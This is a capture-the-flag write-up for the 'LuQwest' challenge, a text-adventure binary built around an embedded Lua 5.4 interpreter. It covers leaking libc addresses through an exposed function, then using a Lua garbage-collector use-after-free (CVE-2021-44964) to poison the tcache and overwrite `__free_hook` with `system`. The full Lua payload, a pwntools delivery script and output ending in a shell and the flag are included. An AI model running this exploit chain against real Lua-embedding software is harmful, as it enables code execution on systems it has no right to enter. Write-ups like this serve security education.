LuQwest Writeup
===

##### Exploitation:

This binary is a text-adventure player. After some reverse engineering we found embedded Lua 5.4 interpreter that is 
used to load and run game scripts. So it is a good attack surface.

We can confirm that Lua VM is sandboxed, so we cannot read file directly or execute external command.

Looking for some public-known CVE for this version of Lua gives us some candidates to try on.
For instance [CVE-2021-44964](https://www.cvedetails.com/cve/CVE-2021-44964/) that uses the use-after-free vulnerability 
to allow _tcache bin poisoning_ which can change address of the next chunk in tcache bin.
Using it, we can allocate a chunk at `__free_hook` and write the address of `system` function in it, 
and hence execute `/bin/sh` and get the flag.

Thus, we need to find a leakage to get addresses of `__free_hook` and `system` from `libc` library to bypass ASLR.


#### Libc leakage:

Lua function `tostring` is not blocked, and it can leak the address of Lua object e.g. pointer in program's 
heap address space.

Functions `sub_3084` and `sub_42B5` are C function registered to external use in Lua via name `start` and `load`.
Hence, we can leak a pointer like that:

```Lua
print("[Lua]: start = " .. tostring(start))
```

However, we need a pointer from `libc` address space instead. If there is a way to dereference a pointer from Lua 
script, we can point to any function in PLT table and resolve the actual address of the function in `libc` and then add 
offsets to get of `__free_hook` and `system`. Likely there is such way.

While reversing the binary we can recover a lot of Lua functions, for instance:
* `sub_5480` - `void lua_pushinteger(lua_State *L, lua_Integer n)`
* `sub_3D0A` - wrapper of `sub_5480`
* `sub_51D0` - macro `lua_tointeger(L, i)`
* `sub_4C40` - macro `lua_pop(L, n)`
* etc.

Function `start` is used for retrieving game scene description, available options descriptions and options size, 
for later text formatting and printing on the screen. 
It is implemented as a structure data accessed via pointer to address `0x231050` by name `struct`. 
```C
.text:0000000000003084 sub_3084 proc near                       ; start
            ...
.text:00000000000030B2 loc_30B2:
.text:00000000000030B2 mov     rax, [rbp+var_28]
.text:00000000000030B6 lea     rsi, struct
.text:00000000000030BD mov     rdi, rax
.text:00000000000030C0 call    sub_3D0A                         ; lua_pushinteger
.text:00000000000030C5 mov     rax, [rbp+var_28]
.text:00000000000030C9 mov     rdi, rax
.text:00000000000030CC call    sub_42B5                         ; load
```

```
.bss:0000000000231050 ; struc_1 struct
.bss:0000000000231050 struct          struc_1 <?>             ; DATA XREF: sub_3084+32↑o
```

```
00000000 struc_1         struc ; (sizeof=0x14)
00000000 field_0         dq ?                                 ; decription
00000008 field_8         dq ?                                 ; options
00000010 field_10        dd ?                                 ; count
00000014 struc_1         ends
```

So, here pointer `struct` are pushed into Lua program stack as a raw integer type and then function `load` is called.
Lets, step into that function. Bellow is its pseudocode:
```C
__int64 __fastcall sub_42B5(__int64 L)  // load
{
  struc_1 *x; // [rsp+10h] [rbp-10h]
  __int64 v3; // [rsp+18h] [rbp-8h]

  x = (struc_1 *)sub_3D30(L);
  sub_3DEF(L);
  v3 = sub_3D6D(L);
  if ( v3 )
    x->field_0 = v3;
  sub_3D0A(L, (__int64)x);     // lua_pushinteger
  sub_40A1(L);
  sub_3D0A(L, x->field_8);     // <-- dereference pointer  
  return 2LL;                  // return a pair of values
}
```

First call to `sub_3D30` pops value from Lua stack and treats it as a pointer to `struct`:
```C
__int64 __fastcall sub_3D30(__int64 L)
{
  __int64 ret; // [rsp+18h] [rbp-8h]

  ret = sub_51D0(L, 0xFFFFFFFFLL, 0LL);      // lua_tointeger(L, -1)
  sub_4C40(L, 0xFFFFFFFE);                  // lua_pop(L, -1)
  return ret;
}
```

Last two lines in `load` shows that this function returns a pair of values onto the Lua stack, where the second value 
is a de-referenced pointer from structure. Bingo! Function `last` is available from Lua, it assumes its argument to be 
a pointer to structure, and it returns and de-referenced pointer in structure by offset 0x8.

So, we can leak a pointer from `libc` as follows:
```Lua
_, printf = load({}, printf_plt)
print("[Lua]: printf = " .. hex(printf))
```

Then, calculation of needed address is a simple math.

#### CVE trigger:

Lua 5.4 has automatic memory management with a few of garbage collection algorithms, that could be switched via call to 
Lua builtin function `collectgarbage`.

Use-after-free vulnerability occurs when garbage collector forced to change its mode while being collecting the garbage.

```Lua
collectgarbage("incremental", 10)

foo = setmetatable({}, {
    __gc = function()
        collectgarbage("generational")
    end
})
```

We abuse this vulnerability via _tcache bin poisoning attack_ and change the address of the next chunk in tcache bin.
Then allocate a chunk at `__free_hook` and write the address of `system` function in it.
And then, make some objects to contain `0x68732f6e69622f` (`"/bin/sh"`).
When this script is over, `free(object)` in garbage collecting process becomes `system("/bin/sh")`

#### Profit:

```Lua
-- start.text:0x3084
-- printf.got:0x230ED8

function addrof(v)
 local strrep = tostring(v)
 local i = string.find(strrep, '0x')
 if i == nil then
  error("Cannot obtain address of given value")
 end
 return tonumber(string.sub(strrep, i+2), 16)
end

function hex(v)
 return string.format("0x%x", v)
end

base = addrof(start) - 0x3084
print("[Lua]: base = " .. hex(base))

printf_plt = base + 0x230ED8 - 0x8
print("[Lua]: printf@plt = " .. hex(printf_plt))

_, printf = load({}, printf_plt)
print("[Lua]: printf = " .. hex(printf))

system = printf - $SYSTEM_OFFSET$
print("[Lua]: system = " .. hex(system))
free_hook = system + $FREE_HOOK_OFFSET$
print("[Lua]: __free_hook = " .. hex(free_hook))

collectgarbage("incremental", 10)

foo = setmetatable({}, { __gc = function() collectgarbage("generational") end })

for j = 1, 110 do
 foo = {free_hook}
end

for i = 1, 10 do
 foo = {system}
end

for i = 1, 100 do
 foo = {0x68732f6e69622f}
end
```

So the final exploit:
```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *
from base64 import b64encode

# context.log_level = "DEBUG"

if __name__ == "__main__":
    libc = ELF("libc-2.27.so")

    system_offset = libc.symbols["printf"] - libc.symbols["system"]
    free_hook_offset = libc.symbols["__free_hook"] - libc.symbols["system"]

    with open("exploit.lua", "rb") as f:
        script = f.read()

    script = script \
        .replace(b"$SYSTEM_OFFSET$", bytes(hex(system_offset), "ascii")) \
        .replace(b"$FREE_HOOK_OFFSET$", bytes(hex(free_hook_offset), "ascii"))

    conn = remote("peerreview.sstf.site", 37714)
    # conn = process(["luqwest", "script.lua"])
    log.info("Connected")

    conn.recvuntil("» ")
    conn.sendline("L")
    conn.recvuntil(":")

    payload = b64encode(script)
    payload = [b"-----BEGIN GAME-----"] + \
              [payload[i:i + 76] for i in range(0, len(payload), 76)] + \
              [b"-----END GAME-----"]

    for x in payload:
        print(x.decode("ascii"))

        conn.recvuntil("» ")
        conn.sendline(x)

    log.info("Payload sent")

    conn.interactive()
```

Output:
```
[x] Opening connection to peerreview.sstf.site on port 37714
[x] Opening connection to peerreview.sstf.site on port 37714: Trying 211.214.89.198
[+] Opening connection to peerreview.sstf.site on port 37714: Done
[*] Connected
-----BEGIN GAME-----
ZnVuY3Rpb24gYWRkcm9mKHYpCiBsb2NhbCBzdHJyZXAgPSB0b3N0cmluZyh2KQogbG9jYWwgaSA9
IHN0cmluZy5maW5kKHN0cnJlcCwgJzB4JykKIGlmIGkgPT0gbmlsIHRoZW4KICBlcnJvcigiQ2Fu
bm90IG9idGFpbiBhZGRyZXNzIG9mIGdpdmVuIHZhbHVlIikKIGVuZAogcmV0dXJuIHRvbnVtYmVy
KHN0cmluZy5zdWIoc3RycmVwLCBpKzIpLCAxNikKZW5kCgpmdW5jdGlvbiBoZXgodikKIHJldHVy
biBzdHJpbmcuZm9ybWF0KCIweCV4IiwgdikKZW5kCgpiYXNlID0gYWRkcm9mKHN0YXJ0KSAtIDB4
MzA4NApwcmludCgiW0x1YV06IGJhc2UgPSAiIC4uIGhleChiYXNlKSkKCnByaW50Zl9wbHQgPSBi
YXNlICsgMHgyMzBFRDggLSAweDgKcHJpbnQoIltMdWFdOiBwcmludGZAcGx0ID0gIiAuLiBoZXgo
cHJpbnRmX3BsdCkpCgpfLCBwcmludGYgPSBsb2FkKHt9LCBwcmludGZfcGx0KQpwcmludCgiW0x1
YV06IHByaW50ZiA9ICIgLi4gaGV4KHByaW50ZikpCgpzeXN0ZW0gPSBwcmludGYgLSAweDE1YTIw
CnByaW50KCJbTHVhXTogc3lzdGVtID0gIiAuLiBoZXgoc3lzdGVtKSkKZnJlZV9ob29rID0gc3lz
dGVtICsgMHgzOWU0YzgKcHJpbnQoIltMdWFdOiBfX2ZyZWVfaG9vayA9ICIgLi4gaGV4KGZyZWVf
aG9vaykpCgpjb2xsZWN0Z2FyYmFnZSgiaW5jcmVtZW50YWwiLCAxMCkKCmZvbyA9IHNldG1ldGF0
YWJsZSh7fSwgeyBfX2djID0gZnVuY3Rpb24oKSBjb2xsZWN0Z2FyYmFnZSgiZ2VuZXJhdGlvbmFs
IikgZW5kIH0pCgpmb3IgaiA9IDEsIDExMCBkbwogZm9vID0ge2ZyZWVfaG9va30KZW5kCgpmb3Ig
aSA9IDEsIDEwIGRvCiBmb28gPSB7c3lzdGVtfQplbmQKCmZvciBpID0gMSwgMTAwIGRvCiBmb28g
PSB7MHg2ODczMmY2ZTY5NjIyZn0KZW5kCg==
-----END GAME-----
[*] Payload sent
[*] Switching to interactive mode
» [Lua]: base = 0x56208b200000
[Lua]: printf@plt = 0x56208b430ed0
[Lua]: printf = 0x7fdc9ae87e40
[Lua]: system = 0x7fdc9ae72420
[Lua]: __free_hook = 0x7fdc9b2108e8
sh: 1: 0#$�: not found
sh: 1: �G$�: not found
id
uid=1000(player) gid=1000(player) groups=1000(player)
cat flag
SCTF{17_15_d4n63r0u5_70_60_4l0n3!_74k3_7h15_fl46}
```

Flag: `SCTF{17_15_d4n63r0u5_70_60_4l0n3!_74k3_7h15_fl46}`
